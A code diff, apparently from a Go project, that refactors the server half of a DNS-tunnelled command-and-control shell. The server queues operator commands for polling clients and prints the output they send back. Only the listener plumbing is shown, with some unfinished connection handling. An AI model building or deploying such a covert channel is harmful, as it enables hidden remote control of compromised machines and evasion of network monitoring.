@@ -34,22 +34,23 @@ func NewDnsServer(port string, encoder encoder.StringEncoder) *DNSServer {
 	return d
 }
 
-func (s DNSServer) Serve() {
-	go s.shell.Start()
+func (s *DNSServer) Initialize() {
 	server := s.createServer()
 	fmt.Println("Starting Listener on port '" + s.port + "'")
+	go s.shell.Start()
 	err := server.ListenAndServe()
 	if err != nil {
 		fmt.Printf("Failed to start listener: %s\n", err.Error())
 	}
 }
 
-func (s DNSServer) QueueCommand(command string) {
+func (s *DNSServer) QueueCommand(command string) {
 	s.queue.Enqueue(command)
 }
 
 func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	if !h.server.hasConnection {
+		//print client addr here
 		h.server.hasConnection = true
 		h.server.shell.Resume()
 	}
@@ -61,7 +62,7 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	h.server.writeMessage(w, msg)
 }
 
-func (s DNSServer) createServer() *dns.Server {
+func (s *DNSServer) createServer() *dns.Server {
 	return &dns.Server{
 		Addr:      ":" + s.port,
 		Net:       "tcp",
@@ -70,14 +71,14 @@ func (s DNSServer) createServer() *dns.Server {
 	}
 }
 
-func (s DNSServer) createAnswerMessage(r *dns.Msg) *dns.Msg {
+func (s *DNSServer) createAnswerMessage(r *dns.Msg) *dns.Msg {
 	msg := new(dns.Msg)
 	msg.SetReply(r)
 	msg.Authoritative = true
 	return msg
 }
 
-func (s DNSServer) switchCommand(receivedQuestion string, r *dns.Msg) string {
+func (s *DNSServer) switchCommand(receivedQuestion string, r *dns.Msg) string {
 	var command = "idle"
 	switch receivedQuestion {
 	case "poll.":
@@ -86,36 +87,35 @@ func (s DNSServer) switchCommand(receivedQuestion string, r *dns.Msg) string {
 		command = s.handleCallback(r)
 	case "exit.":
 		fmt.Println("Connection closed")
-		//this does not work, never goes back to waiting for connection
-		//idea: let the listener manage his own shell. impelement shell commands for wait for connection etc.
+		//todo problem: hasConnection is only false inside of this scope
 		s.hasConnection = false
-		//print exit message & go back to waiting for connection, has connection = false
+		s.shell.Start()
 	default:
 		command = "idle"
 	}
 	return command
 }
 
-func (s DNSServer) handlePolling() string {
+func (s *DNSServer) handlePolling() string {
 	if s.queue.Len() != 0 {
 		return s.queue.Dequeue().(string)
 	}
 	return "idle"
 }
 
-func (s DNSServer) handleCallback(r *dns.Msg) string {
+func (s *DNSServer) handleCallback(r *dns.Msg) string {
 	collect := s.messageSplitter.Collect(r.Extra)
 	fmt.Println(s.encoder.Decode(collect))
 	s.shell.Resume()
 	return "ok"
 }
 
-func (s DNSServer) buildAnswer(command string) []dns.RR {
+func (s *DNSServer) buildAnswer(command string) []dns.RR {
 	encoded := s.encoder.Encode(command)
 	return s.messageSplitter.Split(encoded)
 }
 
-func (s DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
+func (s *DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
 	err := w.WriteMsg(msg)
 	if err != nil {
 		fmt.Println(err)
